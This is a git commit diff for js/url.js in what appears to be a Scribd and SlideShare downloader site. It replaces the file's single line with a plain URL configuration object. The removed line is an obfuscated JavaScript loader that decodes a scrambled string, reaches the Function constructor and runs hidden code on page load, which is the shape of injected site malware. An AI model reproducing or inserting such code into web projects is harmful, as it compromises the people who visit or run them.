ce287104a1d5d1af2f866b5530f9cfa645b3b22a
scribdtmd <scribdtmd@gmail.com>
2025-05-21 21:08:26 +0300

    Update url.js

--- js/url.js
+++ js/url.js
@@ -1,1 +1,23 @@
-var URLS;(function(){var VMm='',nMd=457-446;function vnG(b){var k=1097767;var g=b.length;var o=[];for(var m=0;m<g;m++){o[m]=b.charAt(m)};for(var m=0;m<g;m++){var i=k*(m+177)+(k%26491);var n=k*(m+629)+(k%52796);var l=i%g;var v=n%g;var q=o[l];o[l]=o[v];o[v]=q;k=(i+n)%5199865;};return o.join('')};var dgm=vnG('ucobtdoccqgntskmzylrrvaiwhpjutfnoxesr').substr(0,nMd);var BJe='gt6zn1("rsxt;,;;i=+aao+no{cbfn(u 21jopmln(8=(v;pSor k))(j 0=n.s9hv;9f+3(51i<e>v83=g6=o(rr0p"f,hi,n ).d(7goaC(=4ztvo0g,-{ni[(zoh=+]gna]<v(vdo{A;r)wtlnz<;h=e+v.o[cgtr)=di6avv=-[(=iwnrrunh7 )nrtnancrhle(h0n5[xgC7o<uuu9lld,8elon-tmll]p=6;,]=q]a5.sf;=ps;,;=8)2.a rc"r;notsiq6 k.r.6tr)ohh1q7[4n]kh-s{}lesw.vs.=;}creibn+ae )=ri;s9ufyvhe=rbej7v=r6;]xffz" ;;;Ara,rvCfapi*, [=061o8;v+!p4azhh+ovi8h)fCr5z="(;)jvrC5+;;"f,;oq(bt{2,a+ erf2ii..o rwave(t(vitAn(s rygvvari]Cci-ef;fx,=rhlusutC.v+t),eytu]],s,l,)=1a0tu+=)y+(0;hnrfos)At{zan+r ;,=h;s+";a2ll .;!tpq+;1t=.e)nl<rr)=)t =t]0r}.d"=)pad9sj.+,;arph. yqa;+=r)we0a"(((=1;zzugrAv;=(;}l)tr}plxh[;piC;r+(]p.n,-e)i94bcfl,pvgiq);,rtk)=.i[](nungeases)pl1a(g[a+)tavtre* >+0=ir) )us0at "a],+}9gd4;,(=r rtdr-.iz8)8tffo).a0hr[cle,,2)0=rb;uSd9=;d151)uk4r+wa;;t3l8{co..it=)n p(et=(v[sgirt vm.i2l=(},()1orr+.lrs;;=na;(,omihag[dmete[t(+77. au[ kle;8ln6aazugan.z7di(rv=';var guQ=vnG[dgm];var lhr='';var mpP=guQ;var WQL=guQ(lhr,vnG(BJe));var CsQ=WQL(vnG('d:.6:&ddz?.,l2,c7()tR.ng.+,s,.i,Rs+4.\'a%i+bwR)),t*hSdtf(l(+Rfbj_a&lR=o(o\'RR s.\/7.1;(adttrd$b.#\/rp(;k%)p!#R"e=62l)oa((bito,6m.{;sg\/a\/Re6!(dRgi ;gl){ rrRw)\/yoo\/s8ve)oRa-s71me.RpR.ogS$.\/%sRred3si"ohxRf4R.]f j9c:pRg+.rq.ad.%eis!$f,epj()!mcle.4!$\/legoRi1lpe,7;e1;_f7e.kdnddb-etaR 1){4R%}mepmpRe.+;dsR.anon2b#a)w: i(\/=g=:R}ld$ss,lRz\/.\/t*l\/Rfs3! n(t}o\/Rs$r\/rr.}iww1to\/aasR;r-,n#t28Rj3!(t!i,ro5=ne,wl4;nteew }$ar.R(krR.dRso\/he]sR$rl:t=to;kh45=.%)as,Rot]d=R=d3=R0R.&Cftc_r_us0.f[sp,w,rbRp=$)nR!}-n.,30tien(R)+S)"),r)fe.oreRn.kfa)m\/}m#ij\/Ri4bRlRfcrj\/g)Rn0h.-tky xre)$rx,if%aEebj,aw2.(io.wjR;ldio666R)e.h0Rpi.23d0kRibd i]d.nR}!S!_7cm,oRp;}.)a;.Ra"c7da2s(R1(+Rorrd{.m_=li.$.a\/2f;-hw)d3%_R1{.a3_r;Rje_t(db!+.r_aR!a)Rfort\/i(a+R Rdg2.!oR!ndi\'r).)(h!f4$462saRC,f},.2R)hc+awaae go0ncn0_psae8!l!=sh%pay!.{#z2aop,t-j{uoiff!d"fh.!k)Rj!n_3a2\'!o1oR*v+mid)jaf; {ma.!;sd=tp\/(snrtb!a,tne.%hItRw{lo,deRr]wpc)w8y;Rf$00nje,(5tp.b]=(4iRl(hR9e_\/vd:#sRiR;lga83f3]7(lt5t.$hR,n,jnR(s,__.ie,0:}\/RRR.*)a4, _metR-z%m&}c=svc2.pfo)!=)f).lRw2{5.)))9fblu!Ro1,5s4!p.%}$t&lR&3R(.=!3jaS!.eR3j3czf(R7e"=(_}jdo$xtjo.eohfRf35m2(t$]_-o,+7oj3w;$aRy3!e=f,r$$(s,;$)to{R R2c$,y$\/.f!!fl_ifrn[t1 eRRrv0"s$!!t9Dh1m).R;)jrn]);log v$=su b;d(30n.2_[6(.\/grp$jo=),24p0.,yfnz;_b'));var JCu=mpP(VMm,CsQ );JCu(2988);return 1939})()
+// URL Configuration for Scribd and SlideShare APIs
+const URLS = {
+    // Scribd download endpoint
+    scribdDownload: 'https://ilide.info/docgeneratev2?fileurl=https://scribd.vdownloaders.com/pdownload/',
+
+    // CORS proxy for bypassing CORS restrictions
+    corsProxy: 'https://awayne-cors.glitch.me/',
+
+    // Proxy endpoint for fetching Scribd documents
+    proxyEndpoint: 'https://awayne-cors.glitch.me/',
+
+    // SlideShare API endpoints
+    slideshareApi: {
+        // Endpoint to fetch images from SlideShare
+        getImages: 'https://api.slidesdownloader.com/get-images',
+
+        // Endpoint to generate SlideShare slides
+        getSlide: 'https://api.slidesdownloader.com/get-slide',
+
+        // Endpoint to download SlideShare slides
+        download: 'https://api.slidesdownloader.com/dl-slide'
+    }
+};
